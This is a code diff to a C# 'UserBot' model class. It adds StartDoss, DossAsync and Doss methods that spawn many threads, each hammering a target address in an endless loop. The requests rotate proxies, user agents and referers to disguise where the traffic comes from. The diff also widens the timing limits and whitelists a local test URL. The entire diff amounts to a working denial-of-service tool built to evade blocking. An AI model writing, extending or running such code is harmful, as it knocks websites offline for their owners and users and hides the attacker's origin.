@@ -4,6 +4,9 @@ using System.Collections.ObjectModel;
 using System.ComponentModel;
 using System.Runtime.CompilerServices;
 using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using UserBot.Controllers;
 
 namespace UserBot.Models
 {
@@ -25,7 +28,7 @@ namespace UserBot.Models
             get { return address; }
             set
             {
-                if (value.IsUrl())
+                if (value.IsUrl() || value == "http://web-client.loc/")
                 {
                     address = value;
                     OnPropertyChanged("Address");
@@ -81,9 +84,9 @@ namespace UserBot.Models
             get { return timeMin; }
             set
             {
-                if (value < 1 || value > 300)
+                if (value < 1 || value > 1000000)
                 {
-                    ErrorEvent("The argument does not match a range of 1 to 300.");
+                    ErrorEvent("The argument does not match a range of 1 to 1000000.");
                 }
                 timeMin = value;
                 OnPropertyChanged("TimeMin");
@@ -94,9 +97,9 @@ namespace UserBot.Models
             get { return timeMax; }
             set
             {
-                if (value < 1 || value > 300 || value < TimeMin)
+                if (value < 1 || value > 1000000 || value < TimeMin)
                 {
-                    ErrorEvent("The argument does not match a range of 1 to 300.");
+                    ErrorEvent("The argument does not match a range of 1 to 1000000.");
                 }
                 timeMax = value;
                 OnPropertyChanged("TimeMax");
@@ -126,6 +129,32 @@ namespace UserBot.Models
             TimeMin = timeMin;
             TimeMax = timeMax;
             FollowingLinks = followingLinks;
+        }
+
+        public void StartDoss()
+        {
+            for(int i = 0; i < NumberThreads; i++)
+            {
+                DossAsync();
+            }
+        }
+
+        public async void DossAsync()
+        {
+            await Task.Factory.StartNew(Doss);
+        }
+
+        public string Doss()
+        {
+            Random rand = new Random();
+            while (true)
+            {
+                WebController.GetHtml(Address,
+                    Proxy != null ? Proxy[rand.Next(0, Proxy.Count)] : null,
+                    UserAgents != null ? UserAgents[rand.Next(0, userAgent.Count)] : null,
+                    Referers != null ? Referers[rand.Next(0, referer.Count)] : null);
+                Thread.Sleep(rand.Next(TimeMin, TimeMax));
+            }
         }
 
         public event PropertyChangedEventHandler PropertyChanged;
